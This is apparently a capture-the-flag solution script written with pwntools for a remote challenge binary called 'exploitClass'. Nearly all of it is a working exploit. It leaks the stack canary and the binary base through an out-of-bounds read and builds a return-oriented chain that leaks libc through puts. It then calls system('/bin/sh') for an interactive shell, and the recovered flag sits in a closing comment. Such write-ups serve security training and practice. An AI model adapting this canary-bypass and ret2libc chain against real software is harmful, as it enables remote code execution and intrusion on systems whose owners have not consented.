#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *
import os

context(arch="amd64", os="linux", endian="little")
#context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.p = None
        self.e = ELF("./exploitClass")
        self.libc = ELF("./libc.so.6")

    def start_binary(self):
#        self.p = process("./exploitClass", env={
#            "LD_PRELOAD": os.path.dirname(os.path.abspath(__file__))+"libc.so.6"
#        })
        self.p = remote("class.uni.hctf.fun", 24241)
        self.p.recvuntil("exit!\n")

    def read_data(self, index):
        self.p.sendline("1")
        self.p.recvuntil("show?\n")
        self.p.sendline(str(index))
        data=self.p.recvline()
        self.p.recvuntil("exit!\n")
        return data

    def write_data(self, index, data, line):
        self.p.sendline("2")
        self.p.recvuntil("write?\n")
        self.p.sendline(str(index))
        self.p.recvuntil("write?\n")
        if line == 1:
            self.p.sendline(data)
        else:
            self.p.send(data)
        self.p.recvuntil("exit!\n")

    def leak_libc(self, bin_base, leak_canary):
        pop_rdi=p64(bin_base+0x14a3)
        puts_got=bin_base+self.e.got["puts"]
        puts_plt=bin_base+self.e.plt["puts"]
        main_addr=p64(bin_base+self.e.symbols["main"])

        self.write_data(22, p64(leak_canary), 0)
        self.write_data(24, "A"*8+pop_rdi[0:4], 0)
        self.write_data(25, pop_rdi[4:]+p64(puts_got), 0)
        self.write_data(26, p64(puts_plt)+main_addr[0:4], 0)
        self.write_data(27, main_addr[4:], 0)
        self.p.sendline("3")
        data=u64(self.p.recvuntil("exit!\n")[17:23]+"\x00"*2)
        return data

    def exec_system(self, libc_base, bin_base):
        pop_rdi=p64(bin_base+0x14a3)
        system_addr=libc_base+self.libc.symbols["system"]
        bin_sh_addr=libc_base+next(self.libc.search('/bin/sh\x00'))

        self.write_data(24, "A"*8+pop_rdi[0:4], 0)
        self.write_data(25, pop_rdi[4:]+p64(bin_sh_addr), 0)
        self.write_data(26, p64(system_addr), 0)
        self.p.sendline("3")

        self.p.interactive()
        self.p.close()

    def pwn_binary(self):
        self.start_binary()

        self.write_data(21, "A"*12, 0)
        self.write_data(22, "A", 0)
        leak_canary=self.read_data(21)[13:-1]
        leak_canary=u64("\x00"+leak_canary)
        log.info("Leak canary: "+hex(leak_canary))

        self.write_data(22, "A"*12, 0)
        self.write_data(23, "A"*4, 0)
        bin_base=u64(self.read_data(21)[28:-1]+"\x00"*2)-self.e.symbols["__libc_csu_init"]
        log.info("Leak binary base address: "+hex(bin_base))

        libc_base=self.leak_libc(bin_base, leak_canary)-self.libc.symbols["puts"]
        log.info("Leak base libc address: "+hex(libc_base))

        self.exec_system(libc_base, bin_base)


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()

#
# flag{n317h3r_p13_n0r_574ck_pr073c70r_c4n_570p_y0u!}
#
